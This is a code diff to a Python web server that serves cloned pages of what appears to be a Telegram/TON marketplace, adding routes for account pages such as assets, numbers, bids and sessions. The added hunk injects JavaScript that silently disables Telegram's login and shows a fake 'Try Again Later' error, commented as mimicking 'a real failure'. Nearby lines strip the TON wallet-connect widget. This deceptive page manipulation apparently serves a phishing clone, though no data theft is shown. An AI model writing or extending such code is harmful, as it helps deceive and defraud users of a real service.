@@ -602,6 +602,18 @@ class Handler(http.server.BaseHTTPRequestHandler):
         content = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', content, flags=re.DOTALL)
         content = re.sub(r'<script[^>]*>(?:(?!</script>).)*?closest\s*\(\s*["\']\.ton-auth-link["\'](?:(?!</script>).)*?</script>', '', content, flags=re.DOTALL)
         content = transform_menu(content)
+        # Override Telegram OAuth — always shows "Try Again Later" like a real failure
+        tg_disable = (
+            '<script>setTimeout(function(){'
+            'if(window.Telegram&&window.Telegram.Login){'
+            'Telegram.Login.init=function(){};'
+            'Telegram.Login.open=function(){'
+            'if(typeof showAlert==="function")'
+            '{showAlert("Try Again Later");}'
+            'else{alert("Try Again Later");}};'
+            '}},0);</script>'
+        )
+        content = content.replace('</body>', tg_disable + '</body>', 1)
         data = content.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
@@ -742,9 +754,19 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.serve_content(content, is_ajax)
             return
 
-        # /me → profile page
+        # /me and /my/* → profile/account pages
         if file_path is None and path == "/me":
             file_path = "html/page_me.html"
+        if file_path is None and path in ("/my/profile",):
+            file_path = "html/page_me.html"
+        if file_path is None and path in ("/my/assets", "/my/usernames", "/my/gifts"):
+            file_path = "html/page_my_assets.html"
+        if file_path is None and path in ("/my/numbers",):
+            file_path = "html/page_my_numbers.html"
+        if file_path is None and path in ("/my/bids",):
+            file_path = "html/page_my_bids.html"
+        if file_path is None and path in ("/my/sessions",):
+            file_path = "html/page_my_sessions.html"
 
         # /username slugs → dynamic username product page
         if file_path is None and re.match(r'^/[a-zA-Z0-9_]+$', path):
